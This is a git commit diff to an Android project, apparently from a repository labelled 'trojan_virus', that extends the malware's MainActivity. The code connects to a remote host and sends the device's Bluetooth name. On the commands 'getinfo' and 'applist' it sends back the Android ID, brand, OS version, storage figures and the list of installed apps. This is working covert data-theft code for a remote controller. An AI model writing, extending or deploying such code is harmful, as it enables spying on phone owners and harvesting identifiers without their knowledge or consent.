643b8474d2a0d45b8675db80fad8700d23027a4f
LinWin-Cloud <2382546858@qq.com>
2023-03-26 17:07:01 +0800

    updata android module

--- Module/android/arch64/trojan_virus/android/app/src/main/java/com/example/application/MainActivity.java
+++ Module/android/arch64/trojan_virus/android/app/src/main/java/com/example/application/MainActivity.java
@@ -3,27 +3,31 @@ package com.example.application;
 import androidx.appcompat.app.AppCompatActivity;
 
 import java.io.BufferedReader;
-import java.io.FileReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
-import java.net.*;
+import java.net.Socket;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Locale;
 
 import android.annotation.SuppressLint;
-import android.app.AlertDialog;
-import android.app.Dialog;
-import android.bluetooth.BluetoothAdapter;
-import android.content.DialogInterface;
-import android.content.Intent;
+import android.app.ActivityManager;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Debug;
+import android.os.Environment;
+import android.os.StatFs;
 import android.provider.Settings;
 import android.widget.TextView;
 
 
 public class MainActivity extends AppCompatActivity {
 
-    @SuppressLint("SetTextI18n")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -36,35 +40,89 @@ public class MainActivity extends AppCompatActivity {
             int port = Integer.parseInt(bufferedReader.readLine());
 
             TextView textView = (TextView) findViewById(R.id.textview);
-            textView.setText(host+" "+port);
+            textView.setText(host + " " + port);
 
-            Socket socket = new Socket(host,port);
-            OutputStream outputStream = socket.getOutputStream();
-            InputStream SocketInputStream = socket.getInputStream();
-            PrintWriter printWriter = new PrintWriter(outputStream);
+            Thread socketThread = new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        Socket socket = new Socket(host, port);
+                        OutputStream outputStream = socket.getOutputStream();
+                        InputStream SocketInputStream = socket.getInputStream();
+                        PrintWriter printWriter = new PrintWriter(outputStream);
 
-            BufferedReader buf = new BufferedReader(new InputStreamReader(SocketInputStream));
+                        BufferedReader buf = new BufferedReader(new InputStreamReader(SocketInputStream));
 
-            printWriter.println("Connect="+ Settings.Secure.getString(getContentResolver(),"bluetooth_name"));
-            printWriter.flush();
+                        printWriter.println(" [ Connect ] " + Settings.Secure.getString(getContentResolver(),"bluetooth_name"));
+                        printWriter.flush();
 
-            while (true)
-            {
-                String message = buf.readLine();
-                if (message == null) {
-                    System.exit(0);
+                        while (true)
+                        {
+                            String message = buf.readLine();
+                            if (message == null) {
+                                break;
+                            }
+                            if (message.equals("getinfo")) {
+                                printWriter.println(getSysInfo());
+                                printWriter.flush();
+                            }
+                            if (message.equals("applist")) {
+                                printWriter.println(getAppList());
+                                printWriter.flush();
+                            }
+                        }
+                        socket.close();
+                    }catch (Exception exception){
+                        exception.printStackTrace();
+                        TextView textView = (TextView) findViewById(R.id.textview);
+                        textView.setText("ERROR: "+exception.getMessage());
+                    }
                 }
-                try {
-                }
-                catch (Exception exception){
-                    socket.close();
-                }
-            }
+            });
+            socketThread.start();
         }
         catch (Exception exception) {
             exception.printStackTrace();
             TextView textView = (TextView) findViewById(R.id.textview);
-            textView.setText(exception.getMessage());
+            textView.setText("ERROR: "+exception.getMessage());
         }
+    }
+    public String getSysInfo() {
+        String phoneName = " Phone Name: "+ Settings.Secure.getString(getContentResolver(),"bluetooth_name");
+        String language = " Language: " + Locale.getDefault().getLanguage();
+        @SuppressLint(" HardwareIds") String androidId = " Android Id: "+ Settings.Secure.getString(getContentResolver(),Settings.Secure.ANDROID_ID);
+        String phoneBrand = " Phone Brand: "+ Build.BRAND;
+        String version = " Release Version: "+Build.VERSION.RELEASE;
+        final StatFs statFs = new StatFs(Environment.getDataDirectory().getPath());
+        long totalCounts = statFs.getBlockCountLong();//总共的block数
+        long availableCounts = statFs.getAvailableBlocksLong() ; //获取可用的block数
+        long size = statFs.getBlockSizeLong(); //每格所占的大小，一般是4KB==
+        long availROMSize = availableCounts * size;//可用内部存储大小
+        long totalROMSize = totalCounts *size; //内部存储总大小
+        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
+        String ram = " ROM: "+ String.valueOf(totalROMSize);
+        String availROM = " AvailRom: " + String.valueOf(availROMSize);
+
+        StringBuffer stringBuffer = new StringBuffer("");
+        stringBuffer.append("/n/n");
+        stringBuffer.append( "[System Information]/n");
+        stringBuffer.append(phoneName+"/n");
+        stringBuffer.append(language+"/n");
+        stringBuffer.append(phoneBrand+"/n");
+        stringBuffer.append(version+"/n");
+        stringBuffer.append(ram+"/n");
+        stringBuffer.append(availROM+"/n");
+        stringBuffer.append(androidId+"/n");
+
+        return stringBuffer.toString();
+    }
+    public String getAppList() {
+        List<ApplicationInfo> allApps = getPackageManager().getInstalledApplications(0);
+        StringBuffer stringBuffer = new StringBuffer("");
+        for(ApplicationInfo ai : allApps) {
+            stringBuffer.append(" -- "+ai.packageName);
+            stringBuffer.append("/n");
+        }
+        return stringBuffer.toString();
     }
 }
